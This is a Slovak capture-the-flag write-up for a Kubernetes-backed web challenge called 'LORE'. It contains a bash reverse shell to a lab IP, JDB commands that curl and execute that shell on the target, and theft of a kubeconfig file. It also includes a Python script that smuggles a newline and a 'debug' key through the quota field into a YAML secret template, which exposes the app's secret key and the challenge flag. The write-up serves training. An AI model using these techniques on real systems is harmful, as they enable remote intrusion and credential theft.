# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.
> 
> - The entry point to LORE is at [http://intro.lore.tcc](http://intro.lore.tcc "http://intro.lore.tcc").

> See you in the next incident!
> 
> **Hint1:**
> Be sure you enter flag for correct chapter.
> 
> 
> **Hint2:**
> In this realm, challenges should be conquered in a precise order, and to triumph over some, you'll need artifacts acquired from others - a unique twist that defies the norms of typical CTF challenges.

----------

# Riešenie #

Na stránke intro máme 4 slajdy, každý pre kždú kapitolu. Každý obsahuje nejakú vetu, ktorá sa zdá byť nejakým dodatočným hintom

> [4 Uncle](http://sam.lore.tcc/ "4 Uncle")
> 
> Sam, the machine hums,
> Whirring gears in silent night,
> Metal heart always beating.


Tak a sme na samovi, ktorého zdrojáky poznáme z prvej úlohy v tejto vetve, takže zhruba vieme ako funguje.

Stránka úlohy obsahuje **New project request form** a textbox pre **Name** a Combobox pre Quota s výberom možností 1GB/10GB/100GB/1TB. Po zadaní aspoň 5 znakového mena sa nám zobrazí stránka status.html

	Project status

    {"name": "asdfg", "quota": "1GB", "storage": "storage-hal-06", "txid": "76690ebb6d6ee9ceedc06a2b5ffae29c"}

    {"access_token": "NjNkZTQ0ZTZmZmY1ZTBiMjY2YTAwMmEwY2Q1OTMwNGI0Y2RjZGI2Mw==", "quota": "MUdC", "storage": "c3RvcmFnZS1oYWwtMDY="}

zo zdrojákov z cgitu, hlavne z `path: root/web/samweb/templates/status.html`

```
{% extends "base.html" %}
{% block title %}LORE Project mgmt{% endblock %}

{% block content %}
<div>
	<h1>Project status</h2>
	{% if project_config %}
		<pre id="project_config">{{ project_config["data"] | tojson }}</pre>
	{% endif %}
	{% if project_secret %}
		<pre id="project_secret">{{ project_secret["data"] | tojson }}</pre>
	{% endif %}

{% if project_secret and ("debug" in project_secret["data"]) %}
<pre id="debug">
	{{ session }}
	{{ config }}
</pre>
{% endif %}

</div>
{% endblock %}
```

vieme, že zobrazí project_config a project_secret a ak je v project secret "debug":"čokolvek", tak zobrazí ďalšie údaje, medzi ktorými by mala byť aj vlajka. 

v `path: root/hooks/00-hooks.py` máme

```
#!/usr/bin/env python3

import json
import os
import subprocess
import sys
from pathlib import Path
from random import choice as random_choice
from secrets import token_hex


QUEUE_NS = "sam-queue"

CONFIG = f"""
configVersion: v1
kubernetes:
  - apiVersion: v1
    kind: ConfigMap
    executeHookOnEvent:
      - Added
      - Deleted
    namespace:
      nameSelector:
        matchNames:
          - {QUEUE_NS}
    allowFailure: true
"""

UPDATE_TEMPLATE = """
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
data:
  storage: "{storage}"
---
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "{quota}"
"""

MANAGED_STORAGE = [
    "storage-hal-01",
    "storage-hal-02",
    "storage-hal-03",
    "storage-hal-04",
    "storage-hal-05",
    "storage-hal-06",
    #    "storage-hal-07",
    #    "storage-hal-08",
]


def config():
    print(CONFIG)


def process_one(ctx):
    if ctx["type"] != "Event":
        return
    if ctx["object"]["kind"] != "ConfigMap":
        return
    if not ctx['object']['metadata']['name'].startswith('request-'):
        return

    if ctx["watchEvent"] == "Added":
        print(f"Added {ctx['object']['kind']} {ctx['object']['metadata']['name']}")

        pname = ctx['object']['metadata']['name']
        # TODO: assign storage accounting it's utilization and provision the token
        storage = random_choice(MANAGED_STORAGE)
        access_token = token_hex(20)
        pquota = ctx['object']['metadata']['annotations']['sam-operator/project_quota']

        subprocess.run(
            ["kubectl", "apply", "-f", "-"],
            input=UPDATE_TEMPLATE.format(
                name=ctx['object']['metadata']['name'],
                queue_ns=QUEUE_NS,
                storage=storage,
                access_token=access_token,
                quota=pquota,
            ).encode()
        )

    elif ctx["watchEvent"] == "Deleted":
        print(f"Deleted {ctx['object']['kind']} {ctx['object']['metadata']['name']}")
 
        pname = ctx['object']['metadata']['name']
        subprocess.run(["kubectl", "delete", "secret", "--ignore-not-found=true", "-n", QUEUE_NS, pname])

    else:
        print("WARN: invalid watchevent type")

    return


def process():
    contexts = json.loads(Path(os.environ["BINDING_CONTEXT_PATH"]).read_text(encoding='utf-8'))
    for item in contexts:
        process_one(item)


if __name__ == "__main__":
    if len(sys.argv)>1 and sys.argv[1] == "--config":
        config()
    else:
        process()
```


vidíme, že je tam hook, ktorý zachytáva eventy kedy sa pridá a vymeže configmaps a na základe toho reaguje.

Keď vo formulári zadáme udaje a potvrdíme, app.py sa postará o to, že vytvorí config mapu, ktorú zachytí tento hooks a v tejto časti

```
		subprocess.run(
            ["kubectl", "apply", "-f", "-"],
            input=UPDATE_TEMPLATE.format(
                name=ctx['object']['metadata']['name'],
                queue_ns=QUEUE_NS,
                storage=storage,
                access_token=access_token,
                quota=pquota,
            ).encode()
        )
```
použije dáta z config mapy a aplikuje na vytvorenie secrets podľa UPDATE_TEMPATE

Bez kubeconfigu, ktorý by nám umožňoval manipulovať z configmapami sa ďalej nepohneme a preto skúsime použiť Hint s artefaktami a zrejme bude niečo viac na jdebug.. Skúsime prejsť súborový systém a pohľadáme, či tam nebude niečo užitočné.. Z predošlej úlohy teda vieme posielať nejaké príkazy, skúsime pre lepšie traverzovanie a obmedzený single instance 5 minútový interval vytvoriť reverse shell.. Tu si pošleme namiesto php súbor, shell.sh súbor s obsahom 

```
#!/bin/bash
bash -i >& /dev/tcp/10.200.0.14/12345 0>&1
```

uložíme ho do /home/kali , kde máme z tohto CWD (cuurent working directory) spustený python http.server

použijeme port 12345 na spojenie

v ďalšom terminal okne si prichystáme pwncat-cs na port 12345

	pwncat-cs -ls 12345

už nám mačička počúva, v jdb zadáme breakpoint ako v úlohe 3 a keď ho hitne, zadáme po jednom tieto tri príkazy, ktoré zakaždým zopakujeme (aj zo zadanim breakpoitu) keď nás kickne.

    print new java.lang.Runtime().exec("curl -o /tmp/shell.sh http://10.200.0.14:8080/shell.sh")
    print new java.lang.Runtime().exec("chmod +x /tmp/shell.sh")
    print new java.lang.Runtime().exec("/bin/bash /tmp/shell.sh")

Po veľmi obšírnom hľadaní a mnoho znovupripojeniach som v priečinku /mnt na serveri objavil jeden config


    (remote) tomcat@jgames-55bf46984b-slpsq:/usr/local/tomcat$ cd /
    (remote) tomcat@jgames-55bf46984b-slpsq:/$ cd mnt
    (remote) tomcat@jgames-55bf46984b-slpsq:/mnt$ ls -la
    total 16
    drwxrwxrwx 2 root root 4096 Oct 28 07:34 .
    drwxr-xr-x 1 root root 4096 Oct 31 21:55 ..
    -rw-r--r-- 1 root root 5623 Oct 28 07:34 kubecreds-jacob.config
    (remote) tomcat@jgames-55bf46984b-slpsq:/mnt$ 
    (local) pwncat$ download kubecreds-jacob.config
    kubecreds-jacob.config ━━━━━━━━━━━ 100.0% • 5.6/5.6 KB • ? • 0:00:00
    [18:03:27] downloaded 5.62KiB in 0.20 seconds  download.py:71
    (local) pwncat$
    Active Session: 10.99.24.81:54983 


ktorý som si rovno stiahol

Zo zdrojákov z cgitu vieme, že nás tu zaujímaju dva namespace - sam-web a sam-queue

zadáme príkazy

	kubectl --kubeconfig=kubecreds-jacob.config auth can-i --list -n sam-web 
	kubectl --kubeconfig=kubecreds-jacob.config auth can-i --list -n sam-queue 

a zistíme, že pri sam-queue máme možnosť vytvárať a mazať configmapy

```
Resources                                       Non-Resource URLs   Resource Names   Verbs
configmaps                                      []                  []               [create delete]
selfsubjectreviews.authentication.k8s.io        []                  []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```


	configmaps       []        []       [create delete]

configmapa, ktorú posiela app.py má takýto formát
```
"project_name": "debug",
"project_quota": '1GB"',
"txid": "bc6a58c9c10e595b3acf8ce64462a8c7"

podľa

@bp.route("/request", methods=["POST"])
def request_route():
    """main page"""

    form = RequestForm()
    if form.validate_on_submit():
        reqdata = {
            "txid": hexlify(os.urandom(16)).decode(),
            "name": form.data["name"],
            "quota": form.data["quota"] or current_app.config["DEFAULT_QUOTA"],
        }
        session["reqdata"] = reqdata
        KC().create_map(f"request-{reqdata['txid']}", reqdata)

    return redirect(url_for("app.status_route"))
```


txid sa generuje, ale to nám de facto nevadí, skúsime modifikovať configmapu, ktorú teraz vidíme v status.html
zmazaním a znovuvytvorením, ale kedže neprejde request zo stránky, nebude názov generovaný ale bude náž.. akurát txid musí mat prefix request- 

Aktuálne je naše txid 76690ebb6d6ee9ceedc06a2b5ffae29c a name asdfg, skúsime zmeniť meno na helloworld, ale jednoduchšie je to to zautomatizovať nejakým python skriptom, ak sa s tým máme hrať dlhšie, kým nájdeme spôsob ako donútiť do secrets pridať debug key..

```
from kubernetes import client, config

txid = '76690ebb6d6ee9ceedc06a2b5ffae29c'
pquota = '1GB'
pname = 'HelloWorld'

def create_configmap_object():
    global pquota
    global pname
    global txid
    metadata = client.V1ObjectMeta(
        namespace="sam-queue",
        name=f"request-{txid}",
        annotations={
            "sam-operator/project_name": pname,
            "sam-operator/project_quota": pquota
        }
    )
    configmap = client.V1ConfigMap(
        api_version="v1",
        kind="ConfigMap",
        data={
            "project_name": pname,
            "project_quota": pquota,
            "txid": f"{txid}"
        },
        metadata=metadata
    )
    return configmap

# Load the kubeconfig and create API client
config.load_kube_config(config_file='kubecreds-jacob.config')
v1 = client.CoreV1Api()

# Attempt to delete the ConfigMap if it exists
v1.delete_namespaced_config_map(
    name=f"request-{txid}",
    namespace="sam-queue",
    body=client.V1DeleteOptions()
)

# Create the ConfigMap
cm_obj = create_configmap_object()
api = v1.create_namespaced_config_map(body=cm_obj, namespace="sam-queue")

print("ConfigMap created successfully, check the web app status.")

```


Nazrieme do status.html a vidíme našu zmenu

	Project status

	{"project_name": "HelloWorld", "project_quota": "1GB", "storage": "storage-hal-03", "txid": "76690ebb6d6ee9ceedc06a2b5ffae29c"}
	
	{"access_token": "ODZkYWZhNDljZjg5Y2EzM2Y4NmI5YmMyMjZjYTE4NzQyYTZkYzk3OA==", "quota": "MUdC", "storage": "c3RvcmFnZS1oYWwtMDM="}

skúšal som vložiť "debug":"" do configmapy, ale to sa prejavilo len v hornom riadku.

Po dlhšej analýze 00-hooks.py som bol na začiatku len slepý a prehliadol som, že si tam viem pomocou qouty injectnuť ďalší string do UPDATE_TEMPLATE, ktorý vytvára na základe configmapy ten secret

```
UPDATE_TEMPLATE = """
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
data:
  storage: "{storage}"
---
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "{quota}"
"""
```

toto chceme aby vyzeralo takto

```
UPDATE_TEMPLATE = """
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
data:
  storage: "{storage}"
---
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "{quota}"
  debug: ""
"""
```

keď pridáme do quota za 1GB aby to vyzeralo takto 1GB"\n  debug:" bude to vyzerať takto

```
UPDATE_TEMPLATE = """
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
data:
  storage: "{storage}"
---
apiVersion: v1
kind: Secret
metadata:
  name: "{name}"
  namespace: "{queue_ns}"
stringData:
  storage: "{storage}"
  access_token: "{access_token}"
  quota: "1GB"\n  debug:""
"""
```
keďže \n je escape znak pre nový riadok, bude sa to správať akoby tam to \n nebolo ale dalo nový riadok, za ním dve medzery, aby bolo správne odsadenie, pretože python si na tom zakladá a teda náš script bude vyzerať takto

```
from kubernetes import client, config

txid = '76690ebb6d6ee9ceedc06a2b5ffae29c'
pquota = 'BrokenQuota"\n  debug: "hahaha'
pname = 'SmeRiadniHackerzz?'

def create_configmap_object():
    global pquota
    global pname
    global txid
    metadata = client.V1ObjectMeta(
        namespace="sam-queue",
        name=f"request-{txid}",
        annotations={
            "sam-operator/project_name": pname,
            "sam-operator/project_quota": pquota
        }
    )
    configmap = client.V1ConfigMap(
        api_version="v1",
        kind="ConfigMap",
        data={
            "project_name": pname,
            "project_quota": pquota,
            "txid": f"{txid}"
        },
        metadata=metadata
    )
    return configmap

# Load the kubeconfig and create API client
config.load_kube_config(config_file='kubecreds-jacob.config')
v1 = client.CoreV1Api()

# Attempt to delete the ConfigMap if it exists
v1.delete_namespaced_config_map(
    name=f"request-{txid}",
    namespace="sam-queue",
    body=client.V1DeleteOptions()
)

# Create the ConfigMap
cm_obj = create_configmap_object()
api = v1.create_namespaced_config_map(body=cm_obj, namespace="sam-queue")

print("ConfigMap created successfully, check the web app status.")

```

spustíme, refreshneme stránku a voalá

```
Project status

{"project_name": "SmeRiadniHackerzz?", "project_quota": "BrokenQuota\"\n  debug: \"hahaha", "storage": "storage-hal-04", "txid": "76690ebb6d6ee9ceedc06a2b5ffae29c"}

{"access_token": "NGE4NjQzMjZkN2MwNTMwYmU0ZjgyMWU4Y2Q0ZGRjYTRlYWZkODFkYg==", "debug": "aGFoYWhh", "quota": "QnJva2VuUXVvdGE=", "storage": "c3RvcmFnZS1oYWwtMDQ="}

<SecureCookieSession {'csrf_token': '80d6a4b1c567c032946edcec26c1166e6dd26989', 'reqdata': {'name': 'asdfg', 'quota': '1GB', 'txid': '76690ebb6d6ee9ceedc06a2b5ffae29c'}}>

<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'bda2e2426c28bfd0aec5438b2314b210', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'FLAG': 'FLAG{nP0c-X9Gh-bee7-iWxw}', 'QUEUE_NS': 'sam-queue', 'DEFAULT_QUOTA': '1GB'}>
```

----------

## Vlajka ##
    FLAG{nP0c-X9Gh-bee7-iWxw}